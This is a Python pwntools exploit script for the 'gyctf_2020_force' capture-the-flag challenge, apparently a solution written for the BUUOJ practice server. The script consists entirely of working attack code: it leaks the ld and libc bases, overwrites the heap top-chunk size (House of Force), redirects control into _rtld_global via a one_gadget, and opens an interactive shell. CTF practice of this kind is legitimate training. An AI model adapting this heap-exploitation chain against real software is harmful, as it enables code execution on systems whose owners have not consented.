import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./gyctf_2020_force')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./gyctf_2020_force')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld=ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',26209)
			elf=ELF('./gyctf_2020_force')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld=ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		def add(a,c):
			io.sendlineafter('2:puts','1')
			io.sendlineafter('size',str(a))
			io.recvuntil('0x')
			data=int(io.recvuntil('\n',drop=True),16)
			io.sendafter('content',c)
			return data

		def show(a):
			io.sendlineafter('2:puts','2')

		# asm(shellcraft.sh())
		ld_base=add(0x8000000,'a'*0x20+p64(0)+p64(0xffffffffffffffff))+0x8001000-0x10+0x3CA000
		ld.address=ld_base
		libc_base=ld_base-0x3CA000
		libc.address=libc_base
		heap_addr=add(0x10,'a'*0x10+p64(0)+p64(0xffffffffffffffff))-0x10
		size_0=ld.sym['_rtld_global']+3848-0x10-heap_addr-0x20-0x10
		add(size_0,'aaa')
		# add(0x10,'\x00'*8+'/bin/sh\x00')
		# size_1=ld.sym['_rtld_global']+3848-0x10-ld.sym['_rtld_global']-2320-0x10
		# add(size_1,'aaa')
		add(0x10,'\x00'*8+p64(libc_base+one_gadgaet[3]))
		io.sendlineafter('2:puts\n','1')
		io.sendline('-1')


		success('heap_addr:'+hex(heap_addr))
		success('ld_base:'+hex(ld_base))
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue